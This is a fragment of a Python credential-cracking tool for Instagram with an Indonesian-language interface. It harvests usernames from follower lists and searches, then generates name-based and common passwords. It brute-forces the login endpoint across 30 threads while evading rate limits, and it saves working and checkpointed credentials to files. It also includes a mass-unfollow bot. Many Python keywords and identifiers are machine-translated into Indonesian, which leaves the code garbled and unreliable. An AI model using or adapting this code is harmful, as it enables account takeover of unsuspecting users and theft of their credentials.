			info=self.infoAPI(self.cookie,'https://i.instagram.com/api/v1/friendships/%s/following/?count=100000',id)
			self.passwordAPI(info)
		elif c di ('3','03'):
			print ("\n%s%s %sSemakin banyak target semakin banyak id yg terkumpul "%(U,til,O))
			m=int(input('%s%s %sJumlah target%s > %s'%(U,til,O,M,K)))
			mencetak('')
			untuk saya dalam rentang (m):
				saya+=1
				nama=input('%s•%s %s %sMasukan nama%s > %s'%(U,P,i,O,M,K))
				nama=self.searchAPI(self.cookie,nama)
			cetak ('')
			self.passwordAPI(nama)
		elif c di ('4','04'):
			crack_target()
			KELUAR()
		elif c di ('5','05'):
			mencetak('')
			untuk saya di os.listdir('IG'):
				print("%s•%s> %s%s"%(U,M,J,i));jeda(0.07)
			c=input("\n%s•%s masukan berkas %s:%s "%(U,O,M,K))
			g=buka("IG/%s"%(c)).baca().splitlines()
			print(" %s# %s---------------------------------------- %s #"%(P,M,P));jeda(2)
			print('%s%s%s Total akun %s: %s%s '%(U,til,O,M,H,len(g)))
			print(" %s# %s---------------------------------------- %s #%s"%(P,M,P,K));jeda(2)
			print("\n%s•%s Mohon tunggu sedang mengecek akun ... "%(U,O))
			untuk s dalam g:
				usr=s.split("|")[0]
				pwd=s.split("|")[1]
				self.checkAPI(usr,pwd)
			exit("\n%s%s%s Selesai mengecek akun"%(U,til,O));jeda(0.07)
		elif c di ('6','06'):
			berikut global
			enam = 0
			print ("\n%s%s %sBot unfollow-All di jalankan "%(U,til,O))
			x=buka('.kukis.log','r').baca()
			x_id=re.findall('sessionid=(\d+)',x)[0]
			back=self.infoAPI(self.cookie,'https://i.instagram.com/api/v1/friendships/%s/following/?count=100000',x_id)
			untuk saya dalam mengikuti:
				enam+=1
				tidur(float( acak.seragam(nyMnD*10,nyMxD*10) / 10 ))
				six_id=self.sixAPI(i)
				print (f"{U}{til}{O} {str(six)} {i} {H}Unfollow berhasil √")
				self.unfollowAPI(six_id,'5452333948',self.cookie)
				#cetak(w)
			exit(f'\n {H}√ unfollow selesai ...')
			self.menu()
		elif c in ('rm','RM','Rm'):
			os.hapus('.kukis.log')
			os.hapus('.namapengguna')
			jalan ("\n%s%s berhasil menghapus login data "%(M,til))
			KELUAR()
		elif c di ('0','00'):
			KELUAR()
		kalau tidak:
			print ('\n%s%s isi yang benar'%(M,til));jeda(2)
			self.menu()

	def sixAPI(self,six_id):
		url = "https://www.instagram.com/web/search/topsearch/?context=blended&query="+six_id+"&rank_token=0.3953592318270893&count=1"
		x = permintaan.dapatkan(url)
		x_jason = x.json()
		uid = str( x_jason['pengguna'][0].get("pengguna").get("pk") )
		mengembalikan uid

	def unfollowAPI(self,user_id,username_id,cookie):
		uuid=hasilkanUUID(Benar)
		xx=self.s.get("https://www.instagram.com/",headers={"user-agent":User_Agent()}).content
		crf_token = re.findall('{"config":{"csrf_token":"(.*)","penampil"',str(xx))[0]
		s.headers.update({'Koneksi': 'tutup',
                       'Menerima': '*/*',
                       'Content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
                       'Cookie2': '$Versi=1',
                       'Bahasa Terima': 'en-US',
                       'User-Agent': User_Agent()})
		data = json.dumps({'_uuid': uuid,
                           '_uid': nama_nama_id,
                           'user_id': user_id,
                           '_csrftoken': crf_token})
		self.payload = 'signed_body={}.{}&ig_sig_key_version=4'.format(
			self.generateUUID(False),
			urllib.request.quote(data))
		kembalikan s.post('https://i.instagram.com/api/v1/friendships/destroy/%s/'%(user_id),self.payload,cookies=cookie).text

	def searchAPI(self,cookie,nama):
		mencoba:
			x=s.get('https://www.instagram.com/web/search/topsearch/?count=100000&context=blended&query=%s&rank_token=0.21663777590422106&include_reel=true'%(nama),cookies=cookie,headers={ "agen-pengguna":USN})
			x_jason=json.memuat(x.teks)
			untuk saya di x_jason['pengguna']:
				pengguna=i['pengguna']
				nama pengguna=pengguna['namapengguna']
				nama lengkap=pengguna['nama_lengkap']
				internal.append(f'{username}|{fullname}')
		kecuali permintaan.pengecualian.ConnectionError:
			exit('\n%s%s tidak ada koneksi%s\n'%(M,til,N))
		kembali ke dalam

	def idAPI(self,cookie,id):
		mencoba:
			m=s.get('https://www.instagram.com/%s/?__a=1'%(id),cookies=cookie,headers={"user-agent":USN})
			m_jason=m.json()["graphql"]["pengguna"]
			idx=m_jason["id"]
		kecuali permintaan.pengecualian.ConnectionError:
			exit('\n%s%s tidak ada koneksi%s\n'%(M,til,N))
		kecuali Pengecualian sebagai e:
			exit('\n%s%s nama pengguna yg anda masukan salah pastikan target bersifat publik%s\n'%(M,til,N))
		kembali idx

	def infoAPI(self,cookie,api,id):
		mencoba:
			x=s.get(api%(id),cookies=cookie,headers={"user-agent":USN})
			x_jason=json.memuat(x.teks)
			untuk saya di x_jason['pengguna']:
				nama pengguna = i["nama pengguna"]
				nama = i["nama_lengkap"]
				internal.append(f'{username}|{nama}')
				berikut.tambahkan(nama pengguna)
		kecuali permintaan.pengecualian.ConnectionError:
			exit('\n%s%s tidak ada koneksi%s\n'%(M,til,N))
		kecuali Pengecualian sebagai e:
			exit('\n%s%s nama pengguna yg anda masukan salah pastikan target bersifat publik%s\n'%(M,til,N))
		kembali ke dalam

	def passwordAPI(self,xnx):
		print ("\r%s•%s Total pengguna %s> %s%s"%(U,O,M,H,len(internal)))
		cetak(f"""
{U}{til}{O} [ {U}pilih methode crack, silahkan coba satu²{O} ]

{U}{til}{P} 01 {O}Metode {M}V.1 {O}(cepat)
{U}{til}{P} 02 {O}Metode {P}V.2 {O}(lambat)
{U}{til}{P} 03 {O}Metode {H}V.3 {O}(sangat lambat)
		""")
		c=input('%s# %sPilih %s> %s'%(P,O,M,K))
		jika c=='1':
			self.generateAPI(xnx,c)
		elif c=='2':
			self.generateAPI(xnx,c)
		elif c=='3':
			self.generateAPI(xnx,c)
		kalau tidak:
			self.passwordAPI(xnx)

	def generateAPI(self,user,o):
		cetak(f"""
{U}{til}{O} [ {U}pilih user-agent, silahkan coba satu²{O} ]

{U}{til}{P} 01 {O}User-Agent 1
{U}{til}{P} 02 {O}User-Agent 2
{U}{til}{P} 03 {O}User-Agent 3
		""")
		ua=input('%s# %sPilih %s> %s'%(P,O,M,K))
		jika ua=='1':
			uaAPI=User_Agent()
		elif ua=='2':
			uaAPI=user_agent()
		elif ua=='3':
			uaAPI=user_agentAPI()
		cetak(f"""
{U}{til}{O} akun {H}[OK] {O}tersimpan ke file {M}> {H}IG/OK-{day}.txt
{U}{til}{O} akun {M}[{K}CP{M}] {O}tersimpan ke file {M}> {K}IG/CP-{day}.txt
{U}!{O} setiap crack 1k ID, mainkan mode pesawat 3 detik
		""")
		dengan ThreadPoolExecutor(max_workers=30) sebagai shinkai:
			untuk saya di pengguna:
				mencoba:
					nama pengguna=i.split("|")[0]
					sandi=i.split("|")[1].lower()
					untuk w di password.split(" "):
						jika len(w)<3:
							melanjutkan
						kalau tidak:
							w=w.lebih rendah()
							jika o=="1":
								jika len(w)==3 atau len(w)==4 atau len(w)==5:
									sandi=[w+'123',w+'12345']
								kalau tidak:
									sandi=[w+'123',w+'12345']
							elif o=="2":
								jika len(w)==3 atau len(w)==4 atau len(w)==5:
									sandi=[w,w+'123',w+'12345']
								kalau tidak:
									sandi=[w,w+'123',w+'12345']
							elif o=="3":
								jika len(w)==3 atau len(w)==4 atau len(w)==5:
									sandi=[w,w+'123',w+'12345',w,password.lower()]
								kalau tidak:
									sandi=[w,w+'123',w+'12345',w,password.lower()]
							shinkai.submit(self.crackAPI,username,sandi,uaAPI)
				kecuali:
					lulus
		
		os.popen('play-audio data/selesai.mp3')
		keluar("\n%s√ selesai"%(H))

	def APIinfo(mandiri,pengguna):
		mencoba:
			x=s.get("https://www.instagram.com/%s/?__a=1"%(pengguna),header={"user-agent":USN})
			x_jason=x.json()["graphql"]["pengguna"]
			nama=x_jason["nama_lengkap"]
			pengikut=x_jason["edge_followed_by"]["count"]
			mengikut=x_jason["edge_follow"]["count"]
			postingan=x_jason["edge_owner_to_timeline_media"]["count"]
		kecuali:
			lulus
		return nama,pengikut,mengikut,postingan

	def crackAPI(self,user,pas,uaAPI):
		loop global, sukses, pos pemeriksaan
		warna = pilihan acak([M, H, K, B, U, O, P, J])
		sys.stdout.write('\r'+warna+'•\x1b[1;96m [crack] %s/%s [%sOK%s:%s%s%s]-[%sCP%s:%s %s%s] '%(loop,len(internal),H,M,H,len(sukses),O,K,M,K,len(pos pemeriksaan),O)),
		sys.stdout.flush()
		mencoba:
			untuk pw pas:
				token=s.get('https://www.instagram.com/accounts/login/')
				tajuk = {
					'Host': 'www.instagram.com',
					'Agen-Pengguna': uaAPI,
					'Menerima': '/',
					'Bahasa Terima': 'id,en-US;q=0,7,en;q=0,3',
					'Accept-Encoding': 'gzip, deflate, br',
					'X-CSRFToken': token.cookies['csrftoken'],
					'X-Instagram-AJAX': '1d6caaf37cd2',
					'X-IG-App-ID': '936619743392459',
					'X-ASBD-ID': '437806',
					'X-IG-WWW-Klaim': '0',
					'Tipe-Konten': 'application/x-www-form-urlencoded',
					'X-Diminta-Dengan': 'XMLHttpRequest',
					'Panjang Konten': '347',
					'Asal': 'https://www.instagram.com',
					'Koneksi': 'keep-alive',
					'Perujuk': 'https://www.instagram.com/accounts/login/'
				}
				parameter={
                    "nama pengguna": pengguna,
					"enc_password": "#PWD_INSTAGRAM_BROWSER:0:{}:{}".format(random.randint(1000000000, 99999999999),pw),
					"optIntoOneTap": Salah,
					"queryParams": {},
					"stopDeletionNonce": "",
					"trustedDeviceRecords": {}}
				x=s.post("https://www.instagram.com/accounts/login/ajax/",headers=headers,data=param)
				x_jason=json.memuat(x.teks)
				jika "userId" di str(x_jason):
					nama,pengikut,mengikut,postingan=self.APIinfo(user)
					print(f"""\r{J}╔══[ {H}Berhasil                      
{J}║══[{H} Nama akun {M}> {H}{nama}
{J}║══[{H} Nama pengguna {M}> {H}{pengguna}
{J}║══[{H} Kata Sandi {M}> {H}{pw}
{J}║══[{H} Pengikut {M}> {H}{pengikut}
{J}╚══[{H} Mengikuti {M}> {H}{mengikut}
					""")
					os.popen("play-audio dapet.mp3")
					open(f"IG/OK-{day}.txt","a").write(f'{user}|{pw}|{pengikut}|{mengikut}\n')
					sukses.tambahkan(pengguna)
					merusak
				elif 'checkpoint_url' di str(x_jason):
					nama,pengikut,mengikut,postingan=self.APIinfo(user)
					print(f"""\r{J}╔══[ {K}Pos pemeriksaan                      
{J}║══[{K} Nama akun {M}> {K}{nama}
{J}║══[{K} Nama pengguna {M}> {K}{pengguna}
{J}║══[{K} Kata Sandi {M}> {K}{pw}
{J}║══[{K} Pengikut {M}> {K}{pengikut}
{J}╚══[{K} Mengikuti {M}> {K}{mengikut}
					""")
					os.popen("play-audio dapet.mp3")
					open(f"IG/CP-{day}.txt","a").write(f'{user}|{pw}|{pengikut}|{mengikut}\n')
					pos pemeriksaan.append(pengguna)
					merusak
				elif 'Harap tunggu beberapa menit sebelum mencoba lagi.' di str(x.teks):
					sys.stdout.write(f"\r{M} ! terkena spam, aktifkan mode pesawat ");sys.stdout.flush();sleep(10)
					self.crackAPI(user,pas,uaAPI)
				kalau tidak:
					melanjutkan
			lingkaran+=1
		kecuali:
			self.crackAPI(user,pas,uaAPI)

	def checkAPI(self,user,pw):
		mencoba:
			token=s.get("https://www.instagram.com/",headers={"user-agent":User_Agent()}).content
			crf_token=re.findall(r"\"csrf_token\"\:\"(.*?)\"", str(token))[0]
			s.headers.update({
				'otoritas': 'www.instagram.com',
				'x-ig-www-claim': 'hmac.AR08hbh0m_VdJjwWvyLFMaNo77YXgvW_0JtSSKgaLgDdUu9h',
				'x-instagram-ajax': '82a581bb9399',
				'jenis-konten': 'application/x-www-form-urlencoded',
				'menerima': '*/*',
				'agen-pengguna': agen_pengguna(),
				'x-requested-with': 'XMLHttpRequest',
				'x-csrftoken': crf_token,
				'x-ig-app-id': '936619743392459',
				'asal': 'https://www.instagram.com',
				'sec-fetch-site': 'asal-sama',
				'sec-fetch-mode': 'cors',
				'sec-fetch-dest': 'kosong',
				'referer': 'https://www.instagram.com/',
				'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8'
			})
			parameter={
				"nama pengguna": pengguna,
				"enc_password": "#PWD_INSTAGRAM_BROWSER:0:{}:{}".format(random.randint(1000000000, 99999999999),pw),
				"optIntoOneTap": Salah,
				"queryParams": {},
				"stopDeletionNonce": "",
				"trustedDeviceRecords": {}
			}
			x=s.post("https://www.instagram.com/accounts/login/ajax/",data=param);sleep(1)
			x_jason=json.memuat(x.teks)
			jika "userId" di x.text:
				nama,pengikut,mengikut,postingan=self.APIinfo(user)
				cetak(f"""\r   
{J}╔══[ {H}Berhasil                      
{J}║══[{H} Nama akun {M}> {H}{nama}
{J}║══[{H} Nama pengguna {M}> {H}{pengguna}
{J}║══[{H} Kata Sandi {M}> {H}{pw}
{J}║══[{H} Pengikut {M}> {H}{pengikut}
{J}║══[{H} Mengikuti {M}> {H}{mengikut}
{J}╚══[{H} kerja sama {M}> {H}{postingan}
				""")
				os.popen("play-audio dapet.mp3")
			elif 'checkpoint_url' di x.text:
				nama,pengikut,mengikut,postingan=self.APIinfo(user)
				cetak(f"""\r  
{J}╔══[ {K}Pos pemeriksaan                      
{J}║══[{K} Nama akun {M}> {K}{nama}
{J}║══[{K} Nama pengguna {M}> {K}{pengguna}
{J}║══[{K} Kata Sandi {M}> {K}{pw}
{J}║══[{K} Pengikut {M}> {K}{pengikut}
{J}║══[{K} Mengikuti {M}> {K}{mengikut}
{J}╚══[{K} produktivitas {M}> {K}{postingan}
				""")
			elif 'Silakan tunggu beberapa menit' di str(x.text):
				sys.stdout.write(f"\r{M} ! terkena spam, aktifkan mode pesawat ");sys.stdout.flush();sleep(10)
				self.checkAPI(pengguna,pw)
		kecuali:
			self.checkAPI(pengguna,pw)
			
perulangan = 1
def infohhh(username_dev, pass_dev, status):
	mencoba:
		global id_, pengikut, mengikuti, nama
		da = request.get("https://www.instagram.com/%s/?__a=1"%(user),headers={"user-agent":USN})
		data_us_dev = da.json()["graphql"]["pengguna"]
		nama = data_us_dev["nama_lengkap"].encode("utf-8")
		id_ = data_us_dev["id"]
		pengikut = data_us_dev["edge_followed_by"]["count"]
		mengikuti = data_us_dev["edge_follow"]["count"]
	kecuali permintaan.pengecualian.ConnectionError:
		jika status == "":
			exit("\n%s• Tidak ada koneksi internet \n"%(M))
		kalau tidak:
			print ("\r%s• %s : %s > %s \n"%(M,status,username_dev,pass_dev))
			lulus
	kecuali ValueError:
		jika status == "":
			exit("\n%s• IP anda terkena spam, mode pesawat 3 detik \n"%(M))
		kalau tidak:
			print ("\r%s• %s : %s > %s \n"%(M,status,username_dev,pass_dev))
			lulus
	kecuali:
		print ("\r%s• %s : %s > %s \n"%(M,status,username_dev,pass_dev))
		lulus
		
# TARGET PECAH
def crack_target():
	pw_none = ""
	status_tidak ada = ""
	daftar_kata = []
	daftar_kata_crack = []
	target_pengguna = input('\n%s%s %sNama pengguna target%s > %s'%(U,til,O,M,K))
	waktu.tidur(2)
	jalan ("%s%s%s Mohon tunggu ... "%(M,til,O))
	infohhh(target_pengguna, pw_none, status_none)
	nama_pecah = nama.pecah()
	angka = [123,1234,12345]
	daftar_kata.tambahkan(nama.ganti(" ", ""))
	daftar_kata.tambahkan(nama)
	untuk dev dalam angka:
		jika len(nama_pecah) >= 2:
			daftar_kata.tambahkan(nama.ganti(" ", "")+str(dev))
		jika len(nama_pecah) >= 1:
			untuk sub_dev di nama_pecah:
				daftar_kata.tambahkan(sub_dev)
				daftar_kata.tambahkan(sub_dev+str(dev))
		jika len(nama_pecah) >= 2:
			word_list.append(nama_pecah[0]+nama_pecah[1])
			untuk dev_ dalam angka:
				word_list.append(nama_pecah[0]+nama_pecah[1]+str(dev_))
			word_list.append(nama_pecah[1]+nama_pecah[0])
			untuk dev_ dalam angka:
				word_list.append(nama_pecah[1]+nama_pecah[0]+str(dev_))
	daftar_kata.tambahkan(target_pengguna)
	untuk iq di set(word_list):
		jika len(iq) >= 6:
			word_list_crack.append(iq)
	pw_tambahan = ["sayang", "iloveyou", "bismillah", "anjing", "bangsat", "bajingan", "rahasia", "katasandi", "password", "kontol", "123456", "12345678" , "123456789"]
	untuk f di pw_tambahan:
		word_list_crack.append(f)
	print ("%s%s%s berhasil membuat kata sandi "%(U,til,O));jeda(2)
	mencetak
	brute(user_target, word_list_crack)
	KELUAR()
	
def brute(email_dev, san_dev_):
	untuk san_dev_1 di san_dev_:
		mencoba:
			perulangan global
			san_dev = san_dev_1.lower()
			dengan request.Session() sebagai dev:
				pas = q[0]
				url_scrap = "https://www.instagram.com/"
				user_agentz_api = "Mozilla/5.0 (Linux; Android 10; SM-G973F Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, seperti Gecko) Versi/4.0 Chrome/86.0.4240.198 Mobile Safari/537.36 Instagram 166.1.0.42.245 Android (29/10; 420dpi; 1080x2042; samsung; SM-G973F; beyond1; exynos9820; en_GB; 256099204)"
				headerz = {"User-Agent": user_agentz_api}
				data = dev.get(url_scrap+post_, headers=headerz).konten
				crf_token = re.findall('{"config":{"csrf_token":"(.*)","viewer"', str(data))[0]
				header = {"Terima": "*/*","Terima-Encoding": "gzip, deflate, br","Accept-Language": "en-US,en;q=0.5","Host": " www.instagram.com","X-CSRFToken": crf_token,"X-Requested-With": "XMLHttpRequest","Referer": "https://www.instagram.com/accounts/login/","Pengguna -Agen": user_agentz,}
				param = {"username": email_dev,"enc_password": "#PWD_INSTAGRAM_BROWSER:0:{}:{}{}".format(random.randint(1000000000, 99999999999), san_dev,y),"optIntoOneTap": False, "queryParams": {},"stopDeletionNonce": "","trustedDeviceRecords": {}}
			cetak (P+" "+str(c)+"."+O+" kata sandi"+M+" > "+K+san_dev+" ")
			dengan request.Session() sebagai ses_dev:
				url = "https://www.instagram.com/accounts/login/ajax/"
				respon = ses_dev.post(url+post_+y, data=param, header=header)
				data_dev = json.loads(respons.konten)
				l = q.ganti(q, "")
				jika "checkpoint_url" di str(data_dev):
					print (f"""{J}╔══[ {K}Pos pemeriksaan                      
{J}║══[{K} Nama akun {M}> {K}{nama}
{J}║══[{K} Nama pengguna {M}> {K}{email_dev}
{J}║══[{K} Kata Sandi {M}> {K}{san_dev}
{J}║══[{K} Pengikut {M}> {K}{str(pengikut)}
{J}╚══[{K} Mengikuti {M}> {K}{str(mengikuti)}
					""")
					merusak
				elif "userId" di str(data_dev):
					print (f"""{J}╔══[ {H}Berhasil                      
{J}║══[{H} Nama akun {M}> {H}{nama}
{J}║══[{H} Nama pengguna {M}> {H}{email_dev}
{J}║══[{H} Kata Sandi {M}> {H}{san_dev}
{J}║══[{H} Pengikut {M}> {H}{str(pengikut)}
{J}╚══[{H} Mengikuti {M}> {H}{str(mengikuti)}
					""")
					merusak
				elif "Mohon tunggu" di str(data_dev):					
					print ("\r%s! Mode pesawatkan 2 detik "%(M))
					san_dev_split = san_dev.split()
					brute(email_dev, san_dev_split)
				kalau tidak:
					lulus
					pengulangan+=1
		kecuali permintaan.pengecualian.ConnectionError:
			san_dev_split = san_dev.split()
			brute(email_dev, san_dev_split)
		kecuali KeyboardInterupsi:
			exit("%s• Keluar...."%(M))
		kecuali:
			lulus
			

#-----------------------[ SYSTEM-CONTROL ]--------------------#
if __name__=='__main__':
	try:os.system('git pull')
	except:pass
	try:os.mkdir('OK')
	except:pass
	try:os.mkdir('CP')
	except:pass
	try:os.mkdir('DUMP')
	except:pass
	try:os.system('touch .prox.txt')
	except:pass
	try:os.system('clear')
	except:pass
	vevek()
